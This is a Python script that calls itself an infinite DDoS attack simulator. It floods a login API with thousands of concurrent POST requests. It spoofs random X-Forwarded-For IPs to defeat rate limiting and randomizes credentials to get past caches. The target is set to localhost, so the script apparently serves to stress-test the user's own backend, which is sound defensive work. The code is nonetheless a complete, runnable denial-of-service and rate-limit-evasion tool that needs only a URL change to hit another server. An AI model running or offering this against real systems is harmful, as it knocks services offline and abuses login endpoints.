"""
Infinite Loop DDoS Attack Simulator
(Targets the backend directly with randomized IP spoofing)
"""

import asyncio
import aiohttp
import time
import random
import sys

# --- Configuration ---
TARGET_URL = "http://127.0.0.1:8000/api/login"
BATCH_SIZE = 500  # Extreme number of requests per concurrent batch
WORKERS = 50      # Massive number of concurrent workers running batches

def generate_spoofed_ip():
    """Generates a fresh private IP so the rate limiter sees a new IP."""
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 250)}"

async def send_batch(session: aiohttp.ClientSession, worker_id: int):
    """Sends a batch of spam requests to the backend."""
    while True:
        tasks = []
        for _ in range(BATCH_SIZE):
            ip = generate_spoofed_ip()
            headers = {
                "Content-Type": "application/json",
                "X-Forwarded-For": ip
            }
            # Add random garbage to the payload to bypass Exact-Match cache and AST caching if possible
            payload = {
                "username": f"admin_flood_{random.randint(1, 999999)}",
                "password": f"pwd_flood_{random.randint(1, 999999)}"
            }
            tasks.append(
                session.post(TARGET_URL, json=payload, headers=headers)
            )
        
        try:
            start = time.time()
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            latency = time.time() - start
            
            # Simple stats collection for this batch
            status_codes = {}
            for r in responses:
                if isinstance(r, Exception):
                    status_codes["Error"] = status_codes.get("Error", 0) + 1
                else:
                    status_codes[r.status] = status_codes.get(r.status, 0) + 1
                    
            print(f"[Worker-{worker_id}] Sent {BATCH_SIZE} requests in {latency:.2f}s | Statuses: {status_codes}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[Worker-{worker_id}] Failed to send batch: {e}")

async def main():
    print("=" * 60)
    print("WARNING: INITIATING INFINITE DDOS ATTACK LOOP")
    print(f"Targeting: {TARGET_URL}")
    print("=" * 60)
    print("Press Ctrl+C to stop the attack.\n")
    
    # Wait a tiny bit just in case
    await asyncio.sleep(2)
    
    # Configure connection pool for aggressive throughput
    conn = aiohttp.TCPConnector(limit=5000, limit_per_host=5000)
    session = aiohttp.ClientSession(connector=conn)
    
    workers = []
    for i in range(WORKERS):
        workers.append(asyncio.create_task(send_batch(session, i)))
        
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        print("\n[ATTACK ABORTED] Shutting down simulation...")
    except KeyboardInterrupt:
        print("\n[ATTACK ABORTED] Shutting down simulation...")
    finally:
        for w in workers:
            w.cancel()
        await session.close()
        print("Attack terminated.")

if __name__ == "__main__":
    if hasattr(asyncio, 'WindowsSelectorEventLoopPolicy'):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)